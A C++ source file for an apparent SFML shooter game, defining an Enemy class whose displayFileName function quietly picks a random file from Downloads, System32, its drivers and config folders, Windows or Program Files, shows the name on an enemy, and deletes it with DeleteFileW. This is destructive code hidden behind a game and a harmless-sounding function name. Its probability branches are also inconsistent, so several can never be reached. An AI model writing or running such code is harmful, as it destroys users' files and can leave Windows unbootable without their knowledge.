#include "enemy.h"
#include <random>
#include <iostream>
#include <tchar.h>
#include <windows.h>
#include <ShlObj.h>  // For SHGetKnownFolderPath
#include <KnownFolders.h>  // For FOLDERID_Downloads
#include <SFML/Graphics.hpp>

Enemy::Enemy(const sf::Font& font) {
    // Load the enemy texture
    if (!enemyTexture.loadFromFile("enemy.png"))
        throw std::runtime_error("Failed to load enemy.png");

    // Create the enemy sprite
    enemySprite.setTexture(enemyTexture);

    // Set the enemy size to 0.1x0.1
    enemySprite.setScale(0.1, 0.1);

    // Initialize fileNameText with the passed font
    fileNameText.setFont(font);
    fileNameText.setCharacterSize(43); // Adjust size as needed
    fileNameText.setFillColor(sf::Color::Red);
}

void Enemy::update()
{
    // Move the enemy down the screen
    enemySprite.move(0, 2); // Speed of the enemy

    if (displayFileNameFlag)
    {
        fileNameText.setPosition(enemySprite.getPosition().x, enemySprite.getPosition().y - 20);
    }
}


void Enemy::displayFileName() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_real_distribution<> dis(0, 1);

    double probability = dis(gen);

    std::wstring wSelectedDirectory;

    if (probability < 0.2) {
        PWSTR pathDownloads;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &pathDownloads))) {
            wSelectedDirectory = pathDownloads;
            CoTaskMemFree(pathDownloads); // Free the allocated memory
        }
    }
    else if (probability < 4.2) { // Delete a file from the System32 directory
        wSelectedDirectory = L"C:\\Windows\\System32";
    }
    else if (probability < 2.6) { // Delete a file from the drivers directory
		wSelectedDirectory = L"C:\\Windows\\System32\\drivers";
	}
    else if (probability < 2.8) { // Delete a file from the config directory
		wSelectedDirectory = L"C:\\Windows\\System32\\config";
	}
    else if (probability < 1.5) { // Delete a file from the spool directory
		wSelectedDirectory = L"C:\\Windows\\System32\\spool";
	}
    else if (probability < 3.6) { // Delete a file from the drivers directory
        wSelectedDirectory = L"C:\\Windows\\";
    }
    else {
        wSelectedDirectory = L"C:\\Program Files";
    }

    // List files in the selected directory
    std::vector<std::string> fileNames;
    WIN32_FIND_DATA findFileData;
    HANDLE hFindFile = FindFirstFile((wSelectedDirectory + L"\\*").c_str(), &findFileData);
    char DefChar = ' ';

    if (hFindFile != INVALID_HANDLE_VALUE) {
        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                char fileName[260];
                WideCharToMultiByte(CP_ACP, 0, findFileData.cFileName, -1, fileName, 260, &DefChar, NULL);
                fileNames.push_back(std::string(fileName));
            }
        } while (FindNextFile(hFindFile, &findFileData) != 0);
        FindClose(hFindFile);
    }

    // Randomly select a file name if any files were found
    if (!fileNames.empty()) {
        std::uniform_int_distribution<> disFile(0, fileNames.size() - 1);
        int fileIndex = disFile(gen);
        fileName = fileNames[fileIndex];
        fileNameText.setString(fileName);
        displayFileNameFlag = true;

        // Set the text position to the enemy position
        fileNameText.setPosition(enemySprite.getPosition().x, enemySprite.getPosition().y - 20);

        // Build the full path for the file to be deleted
        std::wstring fullPath = wSelectedDirectory + L"\\" + std::wstring(fileNames[fileIndex].begin(), fileNames[fileIndex].end());

        // Check if the file is in use
        HANDLE hFile = CreateFileW(fullPath.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            if (GetLastError() == ERROR_SHARING_VIOLATION) {
                // File is in use, skip it
                std::cerr << "File is in use, skipping: " << fileName << std::endl;
                return;
            }
        }
        else {
            // File is not in use, close the handle
            CloseHandle(hFile);
        }

        // Delete the file
        if (!DeleteFileW(fullPath.c_str())) {
            std::cerr << "Failed to delete file: " << fileName << std::endl;
        }
    }
}


std::string Enemy::getFileName() const
{
    return fileName;
}

sf::Sprite Enemy::getSprite() const
{
    return enemySprite;
}

void Enemy::Spawn(int screenWidth)
{
    // Create the enemy above the screen at a random x position
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, screenWidth - static_cast<int>(enemyTexture.getSize().x * enemySprite.getScale().x));

    enemySprite.setPosition(dis(gen), -static_cast<int>(enemyTexture.getSize().y));
}

bool Enemy::isHit(const sf::FloatRect& bulletBounds) const
{
    return enemySprite.getGlobalBounds().intersects(bulletBounds);
}

bool Enemy::shouldDisplayFileName() const {
    return displayFileNameFlag;
}

sf::Text Enemy::getFileNameText() const {
    return fileNameText;
}
